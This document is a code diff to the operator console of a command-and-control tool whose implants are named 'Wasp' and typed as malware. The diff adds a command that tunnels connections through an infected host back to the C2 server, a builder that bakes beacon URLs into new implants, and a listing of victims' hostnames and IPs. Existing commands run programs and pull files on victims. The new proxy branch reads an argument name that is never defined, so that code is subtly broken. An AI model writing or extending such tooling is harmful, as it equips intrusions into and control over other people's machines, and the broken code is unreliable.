@@ -10,7 +10,8 @@ from pathlib import Path
 
 from constants import WASP_HOME, WASPS_PATH
 from wasp_types import WaspMalware, WaspCommand, WaspResponse, logger, WaspException
-from wasp_commands import WaspCommandDownload, WaspCommandExecute, WaspCommandFileList
+from wasp_commands import WaspCommandDownload, WaspCommandExecute, WaspCommandFileList, WaspCommandProxy
+from wasp_builder import WaspBuildConfiguration
 
 class WaspUI(object):
     selected_wasp: Optional[WaspMalware] = None
@@ -75,12 +76,17 @@ if __name__ == '__main__':
     file_list_parser = subparser.add_parser("ls", aliases=["directory-list", "dir"], help="List a directory on the Wasp", exit_on_error=False)
     file_list_parser.add_argument("PATH", type=Path, help="The path to list on the Wasp")
 
+    proxy_parser = subparser.add_parser("proxy", aliases=['tunnel'], help="Proxy a connection through the Wasp", exit_on_error=False)
+    proxy_parser.add_argument('REVERSE_PORT', type=int, help='The port on the C2 server to connect to. This must be open on the C2 server before we run the command')
+    proxy_parser.add_argument('DESTINATION_HOST', type=str, help='The host to connect to. This will be connected to by the wasp host')
+    proxy_parser.add_argument('DESTINATION_PORT', type=int, help='The port to connect to. This will be connected to by the wasp host')
+
     queue_parser = subparser.add_parser("queue", help="Display the currently queued commands for this Wasp", exit_on_error=False)
 
     build_parser = subparser.add_parser("build", aliases=["configure", "config"], help="Build a Wasp", exit_on_error=False)
-    build_parser.add_argument("--beacon-url", type=str, help="The URL to the C2 server, in the form wasp://hostname:port")
-    build_parser.add_argument("--backup-beacon-url", type=str, help="The URL to the backup C2 server, in the form wasp://hostname:port")
-    build_parser.add_argument("PATH", type=Path, help="The to place the built Wasp")
+    build_parser.add_argument("--beacon-url", required=True, type=str, help="The URL to the C2 server, in the form wasp://hostname:port")
+    build_parser.add_argument("--backup-beacon-url", required=False, type=str, help="The URL to the backup C2 server, in the form wasp://hostname:port")
+    build_parser.add_argument("PATH", type=Path, help="The path to place the built Wasp")
 
     # TODO: Implement "vim"
     # Download file locally
@@ -96,6 +102,8 @@ if __name__ == '__main__':
         select_parser,
         command_parser,
         download_parser,
+        proxy_parser,
+        build_parser,
     ]:
         p.exit = _explode
 
@@ -109,7 +117,8 @@ if __name__ == '__main__':
             match args.wasp_command:
                 case "list":
                     for wasp in ui.wasps:
-                        print(wasp)
+                        pending_tasks = '📫' if wasp.has_tasks() else ''
+                        print(f" --[ 🐝 {wasp.wasp_id} :: {wasp.hostname} :: 🌏 {wasp.local_ip} - Tasks pending: {pending_tasks} {wasp.has_tasks()} :: 📂 {wasp.wasp_directory} ]--")
                 case 'select':
                     wasp_id = args.WASP_ID
                     ui.select_wasp(wasp_id)
@@ -133,6 +142,17 @@ if __name__ == '__main__':
                     if ui.selected_wasp:
                         for command in ui.selected_wasp.get_tasks():
                             print(command)
+                case 'proxy':
+                    listen_port = args.LISTEN_PORT
+                    destination_host = args.DESTINATION_HOST
+                    destination_port = args.DESTINATION_PORT
+                    if ui.selected_wasp:
+                        task = WaspCommandProxy(ui.selected_wasp, listen_port, destination_host, destination_port)
+                        ui.submit_command(task)
+                case 'build':
+                    config = WaspBuildConfiguration(args.beacon_url, args.backup_beacon_url)
+                    built_path = config.build_wasp(args.PATH)
+                    print(f"Built Wasp to {built_path}")
                 case _:
                     raise WaspException("Unimplemented Command")
         except argparse.ArgumentError:
